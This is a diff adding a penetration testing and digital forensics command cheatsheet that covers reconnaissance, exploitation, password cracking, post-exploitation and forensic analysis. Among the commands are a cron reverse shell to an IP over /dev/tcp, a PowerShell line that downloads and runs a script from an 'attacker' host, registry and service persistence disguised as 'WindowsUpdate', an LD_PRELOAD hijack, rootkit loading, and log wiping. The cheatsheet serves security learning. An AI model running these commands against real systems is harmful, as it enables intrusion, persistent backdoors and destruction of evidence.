@@ -1,0 +1,319 @@
+KALI LINUX PENETRATION TESTING & DIGITAL FORENSICS MASTER CHEATSHEET
+FROM BEGINNER TO ELITE PROFESSIONAL
+
+PENETRATION TESTING METHODOLOGY COMMANDS
+
+INFORMATION GATHERING PHASE
+
+DNS ENUMERATION
+Basic DNS lookup: dig target.com
+All DNS records: dig target.com ANY
+Reverse DNS lookup: dig -x 192.168.1.1
+Zone transfer attempt: dig @ns1.target.com target.com AXFR
+DNS brute force: dnsenum target.com
+Subdomain discovery: sublist3r -d target.com
+Amass deep enumeration: amass enum -d target.com
+
+NETWORK DISCOVERY
+Ping sweep: nmap -sn 192.168.1.0/24
+Quick TCP scan: nmap -T4 -F target.com
+Comprehensive scan: nmap -sS -sU -p- -A -T4 target.com
+OS detection: nmap -O target.com
+Service version: nmap -sV target.com
+Masscan internet scan: masscan -p80,443 0.0.0.0/0 --rate=10000
+
+WHOIS AND NETWORK INTELLIGENCE
+Domain information: whois target.com
+IP information: whois 192.168.1.1
+Network range: whois -h whois.arin.net 192.168.1.1
+ASN information: whois -h whois.radb.net AS15169
+
+WEB RECONNAISSANCE
+Directory brute force: dirb http://target.com
+Gobuster scan: gobuster dir -u http://target.com -w wordlist.txt
+Nikto web scanner: nikto -h http://target.com
+Whatweb identification: whatweb target.com
+Wappalyzer-like: wafw00f http://target.com
+
+VULNERABILITY ASSESSMENT PHASE
+
+NETWORK VULNERABILITY SCANNING
+Nmap vulnerability scripts: nmap --script vuln target.com
+NSE custom scripts: nmap --script http-enum target.com
+OpenVAS setup: gvm-setup && gvm-start
+Nessus alternative: lynis audit system
+
+WEB VULNERABILITY SCANNING
+SQL injection test: sqlmap -u "http://target.com/page?id=1"
+XSS testing: xsstrike -u http://target.com
+CSRF testing: csrf-token-checker http://target.com
+File inclusion: fimap -u http://target.com
+WordPress scanning: wpscan --url http://target.com
+
+SSL/TLS TESTING
+SSL scan: sslscan target.com:443
+Cipher check: testssl.sh target.com:443
+Heartbleed test: ssl-heartbleed target.com
+
+EXPLOITATION PHASE
+
+METASPLOIT FRAMEWORK
+Start Metasploit: msfconsole
+Search exploits: search exploit eternalblue
+Use exploit: use exploit/windows/smb/ms17_010_eternalblue
+Set options: set RHOSTS 192.168.1.100
+Set payload: set payload windows/meterpreter/reverse_tcp
+Exploit: exploit OR run
+
+STANDALONE EXPLOITS
+Compile and run: gcc exploit.c -o exploit && ./exploit
+Python exploits: python exploit.py --target 192.168.1.100
+Searchsploit: searchsploit apache 2.4
+Download exploit: searchsploit -m 42031.py
+
+SOCIAL ENGINEERING
+SEToolkit: setoolkit
+Phishing campaign: setoolkit -> Social-Engineering Attacks -> Spear-Phishing
+Credential harvester: setoolkit -> Social-Engineering Attacks -> Website Attack Vectors -> Credential Harvester
+
+PRIVILEGE ESCALATION
+
+LINUX PRIVILEGE ESCALATION
+Automated enumeration: linpeas.sh
+Linux exploit suggester: linux-exploit-suggester.sh
+SUID files: find / -perm -4000 2>/dev/null
+Sudo rights: sudo -l
+Kernel exploits: uname -a
+Cron jobs: crontab -l && ls -la /etc/cron*
+
+WINDOWS PRIVILEGE ESCALATION
+Windows PEAS: winpeas.bat
+PowerUp.ps1: IEX(New-Object Net.WebClient).DownloadString('http://attacker/PowerUp.ps1')
+Service permissions: accesschk.exe -uwcqv "Authenticated Users" *
+AlwaysInstallElevated: reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+PASSWORD ATTACKS
+
+OFFLINE PASSWORD CRACKING
+John the Ripper: john --format=raw-md5 hashes.txt
+Hashcat: hashcat -m 0 -a 0 hashes.txt rockyou.txt
+Rule-based attack: hashcat -m 0 -a 0 hashes.txt -r rules/best64.rule
+Wordlist generation: crunch 6 8 abcdefg123 -o wordlist.txt
+
+ONLINE PASSWORD CRACKING
+Hydra SSH: hydra -l user -P passlist.txt ssh://192.168.1.100
+Hydra HTTP: hydra -l admin -P passlist.txt http-get://192.168.1.100/admin
+Medusa FTP: medusa -h 192.168.1.100 -u admin -P passlist.txt -M ftp
+
+HASH EXTRACTION
+Mimikatz Windows: sekurlsa::logonpasswords
+Linux shadow: unshadow passwd.txt shadow.txt > hashes.txt
+
+POST-EXPLOITATION PHASE
+
+METERPRETER COMMANDS
+System info: sysinfo
+User ID: getuid
+Process list: ps
+Migrate process: migrate 1234
+Screenshot: screenshot
+Webcam: webcam_snap
+Keylogger: keyscan_start
+Shell access: shell
+Upload file: upload /path/local.txt
+Download file: download secret.txt
+
+LATERAL MOVEMENT
+Pass the hash: pth-winexe -U admin%hash //192.168.1.100 cmd
+PSExec: psexec.py domain/user:password@192.168.1.100
+WMI execution: wmiexec.py domain/user:password@192.168.1.100
+SSH keys: ssh -i id_rsa user@192.168.1.100
+
+PERSISTENCE MECHANISMS
+Cron job: echo "* * * * * /bin/bash -i >& /dev/tcp/192.168.1.50/4444 0>&1" | crontab -
+SSH key: echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys
+Windows registry: reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\malware.exe"
+Service creation: sc create "WindowsUpdate" binPath= "C:\malware.exe"
+
+DIGITAL FORENSICS COMMANDS
+
+DISK FORENSICS
+
+DISK IMAGING
+Create image: dd if=/dev/sda of=evidence.img bs=4M status=progress
+Forensic copy: dc3dd if=/dev/sda of=evidence.img hash=md5 log=dc3dd.log
+Memory dump: fmem > memory.dmp
+
+DISK ANALYSIS
+File system info: fsstat evidence.img
+File listing: fls -r evidence.img
+File recovery: photorec evidence.img
+Carve files: foremost -i evidence.img -o output/
+
+TIMELINE ANALYSIS
+Bodyfile creation: fls -r -m / evidence.img > bodyfile.txt
+Timeline generation: mactime -b bodyfile.txt -d > timeline.csv
+
+MEMORY FORENSICS
+
+VOLATILITY FRAMEWORK
+Image info: vol.py -f memory.dmp imageinfo
+Process list: vol.py -f memory.dmp --profile=Win7SP1x64 pslist
+Network connections: vol.py -f memory.dmp --profile=Win7SP1x64 netscan
+DLL list: vol.py -f memory.dmp --profile=Win7SP1x64 dlllist
+Malware detection: vol.py -f memory.dmp --profile=Win7SP1x64 malfind
+Command history: vol.py -f memory.dmp --profile=Win7SP1x64 cmdline
+
+MEMORY ANALYSIS
+Strings extraction: strings memory.dmp | grep -i "password"
+Yara scanning: yara -r rules.yara memory.dmp
+
+NETWORK FORENSICS
+
+PCAP ANALYSIS
+Tshark basic: tshark -r capture.pcap
+Follow TCP stream: tshark -r capture.pcap -z follow,tcp,ascii,0
+HTTP requests: tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri
+Export objects: tshark -r capture.pcap --export-objects http,export_folder
+
+TCPDUMP ANALYSIS
+Basic reading: tcpdump -r capture.pcap
+Filter by IP: tcpdump -r capture.pcap host 192.168.1.100
+Filter by port: tcpdump -r capture.pcap port 80
+Conversations: tcpdump -r capture.pcap -qnn -c 1000 | awk '{print $3, $5}' | sort | uniq -c | sort -nr
+
+NETWORK FLOW ANALYSIS
+Argus setup: argus -r capture.pcap -w output.argus
+Flow analysis: ra -r output.argus -n -s stime ltime flgs proto saddr sport dir daddr dport state
+
+MOBILE FORENSICS
+
+ANDROID ANALYSIS
+ADB connection: adb devices
+Shell access: adb shell
+Pull data: adb pull /sdcard/ ./sdcard_backup
+App data: adb backup -f backup.ab com.example.app
+
+IOS ANALYSIS
+iTunes backup: idevicebackup2 backup ./backup_folder
+Backup analysis: iphone-backup-analyzer
+
+MALWARE ANALYSIS
+
+STATIC ANALYSIS
+Strings: strings malware.exe
+File type: file malware.bin
+PE analysis: peframe malware.exe
+Yara scan: yara -w rules.yara malware.exe
+
+DYNAMIC ANALYSIS
+Sandbox execution: inetsim & burpsuite
+Process monitoring: procmon (Windows) OR strace (Linux)
+Network monitoring: wireshark & tcpdump
+
+INCIDENT RESPONSE COMMANDS
+
+TRIAGE COLLECTION
+Live response script: liferator.sh OR GRR Rapid Response
+Process snapshot: ps auxef > processes.txt
+Network connections: netstat -tulpn > network.txt
+Open files: lsof > open_files.txt
+User info: w && last && lastlog
+
+MEMORY ACQUISITION
+Linux memory: avml memory.lime
+Windows memory: winpmem memory.raw
+
+LOG ANALYSIS
+Authentication logs: grep -i "failed" /var/log/auth.log
+Apache logs: tail -f /var/log/apache2/access.log | grep -v "200 OK"
+Event logs (Windows): Get-WinEvent -LogName Security | Where-Object {$_.LevelDisplayName -eq "Error"}
+
+ADVANCED TECHNIQUES
+
+ANTI-FORENSICS
+Timestamp modification: touch -t 202301010000 file.txt
+Log cleaning: sed -i '/192.168.1.100/d' access.log
+Data hiding: steghide embed -cf image.jpg -ef secret.txt -p password
+Encrypted containers: veracrypt --text --create --size=100M --password=strongpass volume.vc
+
+MEMORY RESIDENT MALWARE
+LD_PRELOAD hijacking: echo "/tmp/evil.so" > /etc/ld.so.preload
+Module hiding: insmod rootkit.ko
+Process hiding: https://github.com/m0nad/Diamorphine
+
+NETWORK COVERT CHANNELS
+DNS tunneling: dnscat2
+ICMP tunneling: ptunnel
+HTTP tunneling: reGeorg
+
+FORENSIC ARTIFACT ANALYSIS
+
+BROWSER ARTIFACTS
+Chrome history: sqlite3 ~/.config/google-chrome/Default/History "SELECT url FROM urls;"
+Firefox cookies: sqlite3 ~/.mozilla/firefox/profile.default/cookies.sqlite "SELECT * FROM moz_cookies;"
+
+WINDOWS ARTIFACTS
+Prefetch files: strings *.pf
+Jump lists: parse_jumplist.py *.automaticDestinations-ms
+Registry analysis: regripper -r NTUSER.DAT -p userassist
+
+EMAIL ANALYSIS
+PST parsing: readpst mailbox.pst
+EML analysis: ripmime -i email.eml -d output/
+
+AUTOMATION AND SCRIPTING
+
+BASH SCRIPTS
+Port scanner: for port in {1..65535}; do timeout 1 bash -c "echo >/dev/tcp/$target/$port" && echo "Port $port open"; done
+Subdomain brute: for sub in $(cat subdomains.txt); do host $sub.target.com; done
+
+PYTHON SCRIPTS
+TCP port scanner: python -c "import socket; socket.setdefaulttimeout(1); [print(f'Port {port} open') for port in range(1,1024) if socket.socket().connect_ex(('target',port)) == 0]"
+HTTP directory brute: python -c "import requests; [print(f'Found: {url}') for word in open('wordlist.txt') if requests.get(f'http://target.com/{word.strip()}').status_code == 200]"
+
+POWERSHELL SCRIPTS
+Windows reconnaissance: Get-Process | Where-Object {$_.ProcessName -like "*sql*"}
+Network scan: 1..255 | ForEach-Object {Test-Connection -Count 1 -Delay 1 "192.168.1.$_"}
+
+PROFESSIONAL TOOLS AND FRAMEWORKS
+
+PENETRATION TESTING FRAMEWORKS
+Metasploit: msfconsole
+Empire: powershell-empire
+Cobalt Strike: teamserver
+
+FORENSIC FRAMEWORKS
+Autopsy: autopsy
+SIFT Workstation: sift-cli
+FTK Imager: ftkimager
+
+INCIDENT RESPONSE PLATFORMS
+TheHive: thehive
+GRR: grr-server
+Osquery: osqueryi
+
+CLOUD SECURITY TOOLS
+AWS security: pacu
+Azure security: microburst
+GCP security: gcp_scanner
+
+CONTINUOUS LEARNING RESOURCES
+
+PRACTICE PLATFORMS
+Hack The Box: htb-init
+TryHackMe: openvpn configs
+VulnHub: vagrant boxes
+
+CERTIFICATION PATHS
+OSCP: penetration-testing-with-kali.pdf
+GCFA: sans forensics courses
+CCFP: cyber forensics professional
+
+RESEARCH SOURCES
+Exploit-DB: searchsploit
+Packet Storm: packetstormsecurity.com
+SANS Reading Room: sans.org/reading-room
+ATT&CK Matrix: attack.mitre.org
+
+This comprehensive cheatsheet provides a roadmap from beginner fundamentals to elite professional techniques in penetration testing and digital forensics. Regular practice in controlled environments and continuous learning are essential for mastery.
